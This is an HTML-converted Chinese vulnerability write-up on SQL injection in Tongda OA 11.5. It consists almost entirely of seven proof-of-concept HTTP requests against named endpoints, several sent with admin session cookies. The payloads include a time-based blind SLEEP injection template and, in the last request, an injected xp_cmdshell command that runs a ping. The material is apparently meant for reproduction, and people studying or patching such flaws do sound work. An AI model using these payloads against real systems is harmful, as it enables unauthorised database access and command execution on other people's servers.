<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>通达oa 11.5 sql注入漏洞</h1><h2>一、漏洞简介</h2><h3>利用条件：</h3><p>一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。</p><h2>二、漏洞影响</h2><p>通达oa 11.5</p><h2>三、复现过程</h2><h3>poc 一</h3><p>POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Referer: https://www.0-sec.org/portal/home/<br />Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff<br />Connection: keep-alive<br />Host: www.0-sec.org<br />Pragma: no-cache<br />X-Requested-With: XMLHttpRequest<br />Content-Length: 154<br />X-WVS-ID: Acunetix-Autologin/65535<br />Cache-Control: no-cache<br />Accept: */*<br />Origin: https://www.0-sec.org<br />Accept-Language: en-US,en;q=0.9<br />Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br /><br />starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&amp;endtime=1598918400&amp;view=month&amp;condition=1</p><h3>poc 二</h3><p>GET /general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=1&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total= HTTP/1.1<br />X-Requested-With: XMLHttpRequest<br />Referer: https://www.0-sec.org/<br />Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Encoding: gzip,deflate<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Connection: close</p><h3>poc 三</h3><p>GET /general/email/inbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=inbox&amp;curnum=0&amp;emailtype=ALLMAIL&amp;keyword=&amp;orderby=3--&amp;pagelimit=10&amp;tag=&amp;timestamp=1598069103&amp;total= HTTP/1.1<br />X-Requested-With: XMLHttpRequest<br />Referer: https://www.0-sec.org<br />Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Encoding: gzip,deflate<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Connection: close</p><h3>poc 四</h3><p>GET /general/appbuilder/web/report/repdetail/edit?link_type=false&amp;slot={}&amp;id=2 HTTP/1.1<br />X-Requested-With: XMLHttpRequest<br />Referer: https://www.0-sec.org<br />Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Encoding: gzip,deflate<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Connection: close</p><h3>poc 五</h3><p>无需登陆</p><p>POST /general/file_folder/swfupload_new.php HTTP/1.1<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Referer: http://192.168.202.1/<br />Connection: close<br />Host: 192.168.202.1<br />Content-Length: 391<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US<br />Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2<br /><br />------------GFioQpMK0vv2<br />Content-Disposition: form-data; name="ATTACHMENT_ID"<br /><br />1<br />------------GFioQpMK0vv2<br />Content-Disposition: form-data; name="ATTACHMENT_NAME"<br /><br />1<br />------------GFioQpMK0vv2<br />Content-Disposition: form-data; name="FILE_SORT"<br /><br />2<br />------------GFioQpMK0vv2<br />Content-Disposition: form-data; name="SORT_ID"<br /><br />------------GFioQpMK0vv2--</p><h3>poc 六</h3><p>会过滤掉：空格、制表符、换行符、回车符、垂直制表符等。只能报错，或尝试 and 等语句判断还是没有问题的。</p><p>POST /general/file_folder/api.php HTTP/1.1<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Referer: http://192.168.202.1/general/file_folder/public_folder.php?FILE_SORT=1&amp;SORT_ID=59<br />X-Resource-Type: xhr<br />Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701<br />Connection: close<br />Host: 192.168.202.1<br />Pragma: no-cache<br />x-requested-with: XMLHttpRequest<br />Content-Length: 82<br />x-wvs-id: Acunetix-Deepscan/209<br />Cache-Control: no-cache<br />accept: */*<br />origin: http://192.168.202.1<br />Accept-Language: en-US<br />content-type: application/x-www-form-urlencoded; charset=UTF-8<br /><br />CONTENT_ID_STR=222&amp;SORT_ID=59&amp;FILE_SORT=1&amp;action=sign</p><h3>poc 七</h3><p>POST /general/appbuilder/web/meeting/meetingmanagement/meetingreceipt HTTP/1.1<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36<br />Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&amp;id=5&amp;nosign=true&amp;reminding=true<br />X-Resource-Type: xhr<br />Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701<br />Connection: close<br />Host: 192.168.202.1<br />Pragma: no-cache<br />x-requested-with: XMLHttpRequest<br />Content-Length: 97<br />x-wvs-id: Acunetix-Deepscan/186<br />Cache-Control: no-cache<br />accept: */*<br />origin: http://192.168.202.1<br />Accept-Language: en-US<br />content-type: application/x-www-form-urlencoded; charset=UTF-8<br /><br />m_id=5&amp;join_flag=2&amp;remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--</p></body></html>